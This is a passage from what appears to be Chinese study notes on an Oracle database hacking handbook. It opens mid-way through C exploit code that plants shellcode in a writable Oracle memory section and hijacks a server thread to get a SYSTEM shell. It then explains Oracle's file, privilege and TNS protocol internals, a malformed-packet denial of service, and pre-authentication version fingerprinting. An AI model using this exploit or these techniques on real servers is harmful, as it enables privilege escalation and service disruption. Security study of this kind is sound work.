!=0xC0000003)</span><br><span class="line">                  &#123;</span><br><span class="line">                        p = &amp;buff[9];</span><br><span class="line">                        pid = (int) *p;</span><br><span class="line">                        pid = pid &lt;&lt; 8;</span><br><span class="line">                        p--;</span><br><span class="line">                        pid = pid + (int) *p;</span><br><span class="line"></span><br><span class="line">                        if(pid == tid)</span><br><span class="line">                        &#123;</span><br><span class="line">                              printf(&quot;%d\n&quot;,id);</span><br><span class="line">                              ctx.ContextFlags =</span><br><span class="line">CONTEXT_INTEGER|CONTEXT_CONTROL;</span><br><span class="line">                              if(GetThreadContext(hThread,&amp;ctx)==0)</span><br><span class="line">                                    return printf(&quot;Failed to get</span><br><span class="line">context&quot;);</span><br><span class="line">                              ptr = (unsigned char *)&amp;ctx;</span><br><span class="line">                              ptr = ptr + 184;</span><br><span class="line"></span><br><span class="line">            // This exploit assumes the base address of the</span><br><span class="line">            // section is at 0x044D0000. If it is not at this</span><br><span class="line">            // address on your system - change it.</span><br><span class="line"></span><br><span class="line">                              memmove(ptr,&quot;\x40\x01\x4D\x04&quot;,4);</span><br><span class="line">                              if(SetThreadContext(hThread,&amp;ctx)==0)</span><br><span class="line">                                    return</span><br><span class="line">printf(&quot;%d\n&quot;,GetLastError());</span><br><span class="line">                        &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            hThread = NULL;</span><br><span class="line">            id ++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int WriteShellCode(char *section)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">      SIZE_T size = 0;</span><br><span class="line"></span><br><span class="line">      if(OpenTheSection(section,FILE_MAP_WRITE)==0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;OpenTheSection: Section %s\tError:</span><br><span class="line">%d\n&quot;,section,GetLastError());</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      if(MapTheSection(FILE_MAP_WRITE)==0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;MapTheSection: Section %s\tError:</span><br><span class="line">%d\n&quot;,section,GetLastError());</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      size = GetSizeOfSection();</span><br><span class="line">      if(size == 0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;GetSizeOfSection: Section %s\tError:</span><br><span class="line">%d\n&quot;,section,GetLastError());</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      printf(&quot;Size of section %d\n&quot;,size);</span><br><span class="line"></span><br><span class="line">      if(size &lt; 0x141)</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      size = size - 0x140;</span><br><span class="line"></span><br><span class="line">      if(size &lt; strlen(shellcode))</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      p = p + 0x140;</span><br><span class="line"></span><br><span class="line">      memmove(p,shellcode,strlen(shellcode));</span><br><span class="line"></span><br><span class="line">      return 1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int OpenTheSection(unsigned char *section, DWORD perm)</span><br><span class="line">&#123;</span><br><span class="line">      SIZE_T size=0;</span><br><span class="line">      hSection = OpenFileMapping(perm, FALSE, section);</span><br><span class="line">      if(!hSection)</span><br><span class="line">            return 0;</span><br><span class="line">      else</span><br><span class="line">            return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int MapTheSection(unsigned int rw)</span><br><span class="line">&#123;</span><br><span class="line">      p = (char *)MapViewOfFile(hSection, rw, 0, 0, 0);</span><br><span class="line">      if(!p)</span><br><span class="line">            return 0;</span><br><span class="line">      return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SIZE_T GetSizeOfSection()</span><br><span class="line">&#123;</span><br><span class="line">      MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">      SIZE_T size=0;</span><br><span class="line">      if(!p)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;Address not valid.\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      ZeroMemory(&amp;mbi,sizeof(mbi));</span><br><span class="line">      size = VirtualQuery(p,&amp;mbi,sizeof(mbi));</span><br><span class="line">      if(size !=28)</span><br><span class="line">            return 0;</span><br><span class="line">      size = mbi.RegionSize;</span><br><span class="line">      printf(&quot;Size: %d\n&quot;,size);</span><br><span class="line">      return size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        当本地用户尝试在Windows上连接到Oracle时，它将通过命名管道进行连接。 在主服务器进程中创建了四个线程来处理客户端和服务器之间的通信。 这四个线程具有一个自由访问控制列表（DACL），该列表授予用户打开该线程的权限。</p><p>​        在第4步中，通过尝试进行身份验证，我们在服务器进程中创建了这些线程。</p><p>​        在第5步中，我们运行此漏洞利用程序，这将在服务器进程中打开一个内存部分，并将此处的shellcode写入此处。本部分的地址为0x044D0000（但可能有所不同）。因为本节中的DACL允许每个人都写入该内存，所以我们可以这样做。此部分的名称为* oraspawn_buffer_orcl *，其中orcl是在第2步中获得的数据库SID。注意，我们将shellcode专门写入0x044D0140，即该部分中的0x140字节。我们这样做是为了防止在我们的第二次连接尝试中破坏我们的shellcode。除了将shellcode写入该部分外，我们还设置了线程的执行上下文，换句话说，我们将EIP设置为指向我们的shellcode。</p><p>​        在第6步中，我们重新激活睡眠线程并切换到我们的shellcode。</p><p>​        shellcode在TCP端口6666上生成一个shell，在第7步中我们将其远程登录到该shell。通过运行whoami，我们将以系统特权运行Shell。</p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>​        了解文件系统上的Oracle结构非常有用。在后面的章节中，我们将通过直接访问Oracle文件来绕过数据库强制的访问控制，因此本节介绍了基本布局。安装Oracle的基本目录称为Oracle Home。为了使大多数Oracle实用程序都能正常工作，必须将一个环境变量（称为ORACLE_HOME）设置为此目录。</p><p>​        大多数Oracle可执行文件和动态链接库都位于 bin\oracle.exe，目录中。因此，$ORACLE_HOME/bin应该在PATH环境变量中；否则，该实用程序将再次无法使用。</p><p>​        数据逻辑上存储在表空间中，物理上存储在数据文件中，通常以.dbf为文件扩展名。通常，数据文件位于$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORACLE_HOME/oradata/SID</span><br></pre></td></tr></table></figure><p>​        目录中，其中SID是数据库SID。这些数据文件具有简单的二进制结构。 </p><p>​        Oracle 10g的文件头可以描述如下：字节2表示文件类型-0xA2似乎表示普通数据文件，0xC2是控制文件，0x22是重做日志文件。 0x14至0x17处的DWORD（4个字节）指示文件中每个数据块的大小，0x18至0x1B处的DWORD提供文件中数据块的数目。字节0x1C至0x1F是“魔术”键-始终设置为0x7D7C7B7A。文件头的大小与其他每个块的大小相同，如0x14到0x17，如果它是0x00002000，则将在文件中找到第一个数据块0x00002000字节。</p><p>​        每个数据块在字节block_base + 04和block_base + 05处包含其块号，以及从字节block_base + 0x18到block_base + 0x1B的服务器版本。第一个数据块是特殊的，它包含有关数据文件来自的服务器以及文件本身的信息。例如，数据库的SID可以在block_base + 0x20处找到，表空间名称在block_base + 0x52处，并且此名称的长度在block_base + 0x50处的两个字节处。</p><p>​        前面提到了另外两种重要的文件类型：控制文件和重做日志。控制文件包含有关数据库服务器物理结构的重要信息。重做日志跟踪对数据文件所做的更改，它们充当服务器与数据文件之间的桥梁：在对数据文件进行任何更改之前，它们首先被写入重做日志。因此，如果数据文件出了问题，则可以从这些重做日志中的信息中恢复状态。检查这些日志文件通常可以向攻击者揭示有用的信息。例如，如果用户使用通过密码语法标识的ALTER USER名称来更改其密码，那么明文密码将被写入Oracle 9及更早版本的重做日志中。</p><p>​        数据库初始化配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init &lt;SID&gt; .ora或spfile &lt;SID&gt; .ora</span><br></pre></td></tr></table></figure><p>​        可以位于Windows上的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">％ORACLE_HOME％\database\</span><br></pre></td></tr></table></figure><p>​        和Linux平台上的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ORACLE_HOME/dbs</span><br></pre></td></tr></table></figure><h3 id="网络结构"><a href="#网络结构" class="headerlink" title="网络结构"></a>网络结构</h3><p>​        可以将Oracle配置为侦听TCP套接字（带有或不带有SSL，IPC，SPX和命名管道）。 对于在Windows平台上查看Oracle的用户，请记住，可以通过网络在TCP端口139和445上访问命名管道。（这意味着，即使已将TNS侦听器配置为不在TCP套接字上侦听，仍然可以通过命名管道，远程访问它。 就TCP而言，通常默认在端口1521或1526上侦听服务器。 </p><h3 id="数据库对象"><a href="#数据库对象" class="headerlink" title="数据库对象"></a>数据库对象</h3><p>​        Oracle支持通常会在数据库服务器中期望的典型数据库对象，例如表和视图。 我们稍后将特别注意的其他对象包括触发器，包，过程和函数。 可以通过执行以下SQL列出数据库中存在的所有对象类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct object_type from all_objects order by 1;</span><br></pre></td></tr></table></figure><p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/1.png"></p><p>​        在默认安装的Oracle 11g中，列出了43种以上的对象类型。</p><h3 id="用户和角色"><a href="#用户和角色" class="headerlink" title="用户和角色"></a>用户和角色</h3><p>​        Oracle要求使用用户ID和密码对用户进行身份验证。 Oracle以其使用默认密码创建的默认帐户数量而闻名。 如今，大多数默认帐户通常都已锁定。</p><p>​         Oracle数据库服务器中最强大的用户是SYS，其次是SYSTEM用户。 根据已安装的其他组件，其他功能强大的用户包括但不限于CTXSYS，MDSYS，WKSYS和SYSMAN。 </p><p>​        模式是给定用户拥有的对象的集合。 例如，可以说SCOTT拥有的所有表，视图和过程都存在于SCOTT模式中。 还有一个称为PUBLIC的特殊用户，与PUBLIC用户相关的任何事情都适用于数据库中的每个用户。</p><h3 id="特权"><a href="#特权" class="headerlink" title="特权"></a>特权</h3><p>​        Oracle中的访问控制由特权分配控制。 有两种特权：对象特权（object）和系统特权（system）。 对象特权是指可以对数据库对象（例如表，视图和过程）操作，而系统特权是指用户可以对数据库执行的操作（例如创建和删除）。 特权可以直接分配给用户或角色。 </p><p>​        对象特权包括以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ALTER</span><br><span class="line">DEBUG</span><br><span class="line">DELETE</span><br><span class="line">DEQUEUE</span><br><span class="line">EXECUTE</span><br><span class="line">FLASHBACK</span><br><span class="line">INDEX</span><br><span class="line">INSERT</span><br><span class="line">ON COMMIT REFRESH</span><br><span class="line">QUERY REWRITE</span><br><span class="line">READ</span><br><span class="line">REFERENCES</span><br><span class="line">SELECT</span><br><span class="line">UNDER</span><br><span class="line">UPDATE</span><br><span class="line">WRITE</span><br></pre></td></tr></table></figure><p>​        有超过200个系统特权。 通过执行以下操作，可以获得系统特权的完整列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from system_privilege_map;</span><br></pre></td></tr></table></figure><p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/2.png"></p><p>​        此外，还有一些系统特权组，例如ALTER ANY，CREATE ANY，EXECUTE ANY，ANALYZE，AUDIT，DEBUG，DELETE ANY和DROP ANY。 例如，EXECUTE ANY包括以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE ANY CLASS</span><br><span class="line">EXECUTE ANY EVALUATION CONTEXT</span><br><span class="line">EXECUTE ANY INDEXTYPE</span><br><span class="line">EXECUTE ANY LIBRARY</span><br><span class="line">EXECUTE ANY OPERATOR</span><br><span class="line">EXECUTE ANY PROCEDURE</span><br><span class="line">EXECUTE ANY PROGRAM</span><br><span class="line">EXECUTE ANY RULE</span><br><span class="line">EXECUTE ANY RULE SET</span><br><span class="line">EXECUTE ANY TYPE</span><br></pre></td></tr></table></figure><p>​        要查明用户具有哪些特权，可以查询DBA_TAB_PRIVS和DBA_SYS_PRIVS视图。 </p><h3 id="Oracle-补丁"><a href="#Oracle-补丁" class="headerlink" title="Oracle 补丁"></a>Oracle 补丁</h3><p>​        2004年8月下旬，Oracle发布了期待已久的补丁集。此补丁集修复了安全研究人员（例如作者Esteban Martinez Fayo，Pete Finnigan，Jonathan Gennick，Alexander Kornbrust Stephen Kost，Matt Moore，Andy Rees和Christian Schaller）报告的数百个漏洞。它被称为Alert 68，它预示了与Oracle不同的补丁和补丁发行方法的到来。从那时起，Oracle承诺每三个月发布一次关键补丁更新（CPU）。 CPU往往包含大量的修复程序，并且只有一次（在撰写本文时）没有多次发布过CPU-即2006年7月的CPU。由于这种频率和数量，通常查找具有错误，过时补丁的服务器。结果，管理员认为实际上他们没有受到保护。甲骨文对此公开和私下提出了很多批评。</p><p>​        用于在除8.1.7.4以外的所有Oracle版本上安装Oracle补丁的工具称为“ opatch”。 opatch实用程序读取随补丁一起提供的名为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$PATCH/etc/config/actions</span><br></pre></td></tr></table></figure><p>​        的文件，该文件描述了安装操作的列表，例如要将哪些文件复制到何处。工具运行后，将更新一个名为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ORACLE_HOME/inventory/ContentsXML/comps.xml</span><br></pre></td></tr></table></figure><p>​        的文件。除其他事项外，该文件还包含补丁集已修复的错误号的列表。不建议您依靠此文件中的信息来确定服务器是否容易受到给定漏洞的影响，因为opatch可能会失败，并且由于错误导致comps.xml中的错误导致频繁地重新发布补丁程序文件。这可能会产生误导。</p><p>​        确定服务器是否易受攻击的唯一肯定方法是确认服务器上是否存在易受攻击的代码。您可以通过对所有PLSQL代码进行校验和并将生成的校验和与有缺陷的软件包的已知列表进行比较来做到这一点。使用NGSSoftware的NGSSQuirreL，可以使用DBMS_UTILITY.GET_HASH_VALUE函数。这里有一个简短的解释，因此您可以根据需要自己实现。给定PLSQL包的文本跨DBA_SOURCE视图中的多行存储。对于包的每一行文本，都可以使用DBMS_UTILITY.GET_HASH_VALUE函数生成一个哈希。然后，您将获得每一行的平均值至小数点后30位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set numwidth 50</span><br><span class="line"></span><br><span class="line">SELECT</span><br><span class="line">AVG(DBMS_UTILITY.GET_HASH_VALUE(TEXT,1000000000,POWER(2,30)))</span><br><span class="line">AS CHECKSUM FROM DBA_SOURCE</span><br><span class="line">WHERE OWNER=&#x27;SYS&#x27; AND NAME=&#x27;TEST_F&#x27;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p><img src="/3.PNG"></p><h2 id="Oracle网络体系结构"><a href="#Oracle网络体系结构" class="headerlink" title="Oracle网络体系结构"></a>Oracle网络体系结构</h2><p>​        Oracle网络体系结构包含许多组件，所有组件都与OSI网络模型完全对应。这种体系结构使Oracle客户端和服务器应用程序可以通过TCP/IP等协议进行通信。在应用程序（客户端上的Oracle Call Interface或OCI和服务器上的Oracle Program Interface或OPI）与网络层之间进行接口连接的会话协议称为Net8（Net9），而在SQL * Net之前。</p><p>​        在OCI/OPI和Net8层之间是一个称为“双任务通用”（TTC）的表示协议，该协议负责客户端和服务器之间的字符集和数据类型转换差异。 Net8会话协议有三个组件：网络基础设施、路由/命名/验证和TNS。受支持的传输协议包括TCP / IP（带有或不带有TCP），命名管道和套接字直接协议（SDP），可通过Infiband高速网络进行通信。所有这些的基础是透明网络基板协议，也称为TNS。 TNS的任务是选择Oracle协议适配器，将通信包装在支持的传输协议中。</p><p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/4.png"></p><h3 id="TNS协议"><a href="#TNS协议" class="headerlink" title="TNS协议"></a>TNS协议</h3><h4 id="TNS协议头部"><a href="#TNS协议头部" class="headerlink" title="TNS协议头部"></a>TNS协议头部</h4><p>​        每个TNS数据包都有一个八字节的标头。 头部的前两个字节（WORD）用于数据包长度-包括标头大小。 像所有值一样，大小为big-endian。 如果校验和已完成，则下一个WORD用于数据包校验和，并且此WORD的值为0x0000。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0      8       16            31</span><br><span class="line">+--------------+--------------+</span><br><span class="line">| Packet Length| Packet Chksm | </span><br><span class="line">+------+-------+--------------+   8 byte header</span><br><span class="line">| Type | Rsrvd | Header Chksm | </span><br><span class="line">+------+-------+--------------+</span><br><span class="line">|        P A Y L O A D        |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p>​        通用Header8个字节：</p><table><thead><tr><th>Length</th><th>2</th><th>包的长度，包括通用包头</th></tr></thead><tbody><tr><td>Packet check sum</td><td>2</td><td>包的校验和</td></tr><tr><td>Type</td><td>1</td><td>TNS类型</td></tr><tr><td>Flag</td><td>1</td><td>状态</td></tr><tr><td>Header check sum</td><td>2</td><td>通用头的校验和</td></tr></tbody></table><p>​        数据包类型（Type）例如，最常见的如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Connect packet      Type 1</span><br><span class="line">Accept packet       Type 2</span><br><span class="line">Ack packet          Type 3</span><br><span class="line">Refuse packet       Type 4</span><br><span class="line">Redirect packet     Type 5</span><br><span class="line">Data packet       Type 6</span><br><span class="line">NULL packet         Type 7</span><br><span class="line">Abort packet      Type 9</span><br><span class="line">Resend packet      Type 11</span><br><span class="line">Marker packet      Type 12</span><br><span class="line">Attention packet    Type 13</span><br><span class="line">Control packet      Type 14</span><br></pre></td></tr></table></figure><p>​        连接到Oracle时，客户端在TNS级别向服务器发送一个Connect数据包（类型1），指定他们希望访问的服务名称。如果侦听器知道这种服务，则可能发生以下两种情况之一：TNS侦听器可以发送一个Accept数据包（类型2），或者可以使用重定向数据包将客户端重定向到另一个端口（类型5）。如果出现前一个选项，则客户端将尝试进行身份验证。如果发生后者，则客户端将Connect数据包发送到已将其重定向到的端口，并请求访问该服务。如果一切顺利，则服务器将发出“接受”数据包并进行身份验证。所有身份验证包都是（类型6）的数据包。</p><p>​        如果侦听器不知道客户端正在请求访问的服务，则它将发出“Refuse”数据包（类型4）。通过身份验证后，查询和结果数据包就是“Data”数据包（类型6）。通常，会看到一个类型为12（0x0C）的数据包-这是一个标记数据包，用于中断。</p><p>​        例如，如果服务器希望客户端停止发送数据，则它将向客户端发送一个标记数据包。</p><p>​        继续TNS标头的详细信息，下一个字节是标头标志。通常，这些标志是未使用的，但是10g客户端可以将该值设置为0x04。最后两个字节构成标题校验和的WORD-默认情况下不使用，设置为0x0000：</p><p>​        在深入研究数据包之前，先查看一下“拒绝数据包”（类型4）会很有用。“拒绝数据包”表示某种错误。例如，带有“无效的用户名/密码”的登录被拒绝错误-ORA-01017 。 由于这些错误，第54个字节指示问题。 3是无效密码； 2表示没有这样的用户。 显然，可以从“拒绝”数据包中获得潜在有用的信息。</p><h4 id="TNS协议包体"><a href="#TNS协议包体" class="headerlink" title="TNS协议包体"></a>TNS协议包体</h4><p>​        网络上看到的大多数数据包都是数据包（类型6）。 对于数据包，TNS标头后的WORD用于数据标志。 如果数据包是断开连接数据包，则此WORD设置为0x0040，否则，为0x0000。</p><p>​        注意：当服务器处理设置了数据标志的第二位但未设置第一个（最低有效）位的数据包（类型6）（例如，数字2、6、10， 14，依此类推）。 当服务器接收到这样的数据包时，它会陷入无限循环，从而占用所有可用的CPU处理时间。</p><p>​        数据标志后的下一个字节（字节11）确定数据包中的内容：</p><p>​        0x01表示协议协商。 在此，客户端向服务器发送可接受的协议版本-分别为6、5、4、3、2、1和0。服务器将以通用版本（例如6或5）进行答复，但也会发送 信息，例如它使用的字符集，集合中有多少个字符，版本字符串和服务器标志。</p><p>​        0x02表示数据类型表示形式的交换。</p><p>​        0x03表示两任务界面（TTI）功能调用。 下表列出了一些功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">0x02      Open</span><br><span class="line">0x03      Query</span><br><span class="line">0x04      Execute</span><br><span class="line">0x05      Fetch</span><br><span class="line">0x08      Close</span><br><span class="line">0x09      Disconnect/logoff</span><br><span class="line">0x0C      AutoCommit ON</span><br><span class="line">0x0D      AutoCommit OFF</span><br><span class="line">0x0E      Commit</span><br><span class="line">0x0F      Rollback</span><br><span class="line">0x14      Cancel</span><br><span class="line">0x2B      Describe</span><br><span class="line">0x30      Startup</span><br><span class="line">0x31      Shutdown</span><br><span class="line">0x3B      Version</span><br><span class="line">0x43      K2 Transactions</span><br><span class="line">0x47      Query</span><br><span class="line">0x4A      OSQL7</span><br><span class="line">0x5C      OKOD</span><br><span class="line">0x5E      Query</span><br><span class="line">0x60      LOB Operations</span><br><span class="line">0x62      ODNY</span><br><span class="line">0x67      Transaction - end</span><br><span class="line">0x68      Transaction - begin</span><br><span class="line">0x69      OCCA</span><br><span class="line">0x6D      Startup</span><br><span class="line">0x51      Logon (present password)</span><br><span class="line">0x52      Logon (present username)</span><br><span class="line">0x73      Logon (present password - send AUTH_PASSWORD)</span><br><span class="line">0x76      Logon (present username - request AUTH_SESSKEY)</span><br><span class="line">0x77      Describe</span><br><span class="line">0x7F      OOTCM</span><br><span class="line">0x8B      OKPFC</span><br></pre></td></tr></table></figure><p>​        其中的一些可能在身份验证之前被调用，例如，版本（0x3B）TTI函数：</p><p>​        0x08表示“确定”，从服务器发送来响应客户端。</p><p>​        0x11表示扩展的TTI功能。 这些是在更高版本的Oracle中引入的，因此为了向后兼容，请勿使用0x03。以下是一些功能代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x6b      Switch or Detach session</span><br><span class="line">0x78      Close</span><br><span class="line">0x87      OSCID</span><br><span class="line">0x9A      OKEYVAL</span><br></pre></td></tr></table></figure><p>​        0x20，调用外部过程和服务注册。</p><p>​        0x44，调用外部过程和服务注册。</p><p>​        除了检查Oracle JDBC客户端（classes12.zip）之外，获取TNS协议的最佳方法是使用网络嗅探器从网络上捕获一些数据包，然后查看发生了什么。</p><h3 id="获取Oracle版本"><a href="#获取Oracle版本" class="headerlink" title="获取Oracle版本"></a>获取Oracle版本</h3><p>​        有许多方法可以在身份验证之前，获取Oracle版本号。 </p><h4 id="利用侦听器版本和状态命令"><a href="#利用侦听器版本和状态命令" class="headerlink" title="利用侦听器版本和状态命令"></a>利用侦听器版本和状态命令</h4><p>​        侦听器控制实用程序同时具有版本命令和状态命令。 它们都可以从客户端发出，以请求侦听器的版本号。 还显示了有关运行侦听器的操作系统的详细信息。 请注意，尽管Oracle禁止状态命令远程处理10g，但版本命令仍然有效。 这是版本命令的输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsnrctl</span><br><span class="line">set current_listener 127.0.0.1[可换成远程ip]</span><br><span class="line">version</span><br></pre></td></tr></table></figure><p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/5.png"></p><p>​        从前面的输出中，可以看到服务器正在Windows上运行11.2.0.1.0。</p><h4 id="利用TNS协议版本"><a href="#利用TNS协议版本" class="headerlink" title="利用TNS协议版本"></a>利用TNS协议版本</h4><p>​        在TNS连接数据包中，在数据包中找到9个字节的WORD（大小为2个字节）指定了所使用的TNS协议版本。下一个WORD（字节11和12）指定发送系统可以理解的最早的版本号。</p><p>​        例如，如果运行版本8.1.7.4的Oracle客户端连接到Oracle服务器上的侦听器，则客户端发送0x0136作为正在使用的TNS协议版本，并发送0x012C作为它理解的最早版本。这样，两个不同版本的Oracle可以通过选择他们都理解的TNS版本进行通信。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Oracle 10r2支持0x139</span><br><span class="line">Oracle 9r2支持0x138</span><br><span class="line">Oracle 9i支持0x137</span><br><span class="line">Oracle 8支持0x136。</span><br></pre></td></tr></table></figure><h4 id="利用XML数据库版本"><a href="#利用XML数据库版本" class="headerlink" title="利用XML数据库版本"></a>利用XML数据库版本</h4><p>​    如果XML数据库正在运行，则可以远程登录到TCP端口2100以获取版本信息。 此服务是ftp服务，显示信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">220 PILUM FTP Server (Oracle XML DB/Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production) ready.</span><br></pre></td></tr></table></figure><p>​        同样，TCP端口8080上的XDB Web服务器也显示版本号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: PILUM</span><br><span class="line"></span><br><span class="line">HTTP/1.1 401 Unauthorized</span><br><span class="line">MS-Author-Via: DAV</span><br><span class="line">DAV: 1,2,&lt;http://www.oracle.com/xdb/webdav/props&gt;</span><br><span class="line">Server: Oracle XML DB/Oracle9i Enterprise Edition Release 9.2.0.1.0 -</span><br><span class="line">Production</span><br><span class="line"></span><br><span class="line">WWW-Authenticate: Basic Realm=&quot; XDB&quot;</span><br><span class="line">Date: Mon, 19 Jun 2006 18:57:59 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 147</span><br></pre></td></tr></table></figure><h4 id="利用TNS报错信息"><a href="#利用TNS报错信息" class="headerlink" title="利用TNS报错信息"></a>利用TNS报错信息</h4><p>​        如果侦听器收到它不理解的TNS命令，则会将错误发送回去。 此错误文本包含一个VSNNUM，该VSNNUM包含一个十进制数字，例如169869568。如果我们将此数字转换为十六进制，请查看得到的内容：0x0A200100。 这是伪装的Oracle版本号-在本例中为10.2.0.1.0。 以下shell程序转储来自于不理解“unbreakable”命令的侦听器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 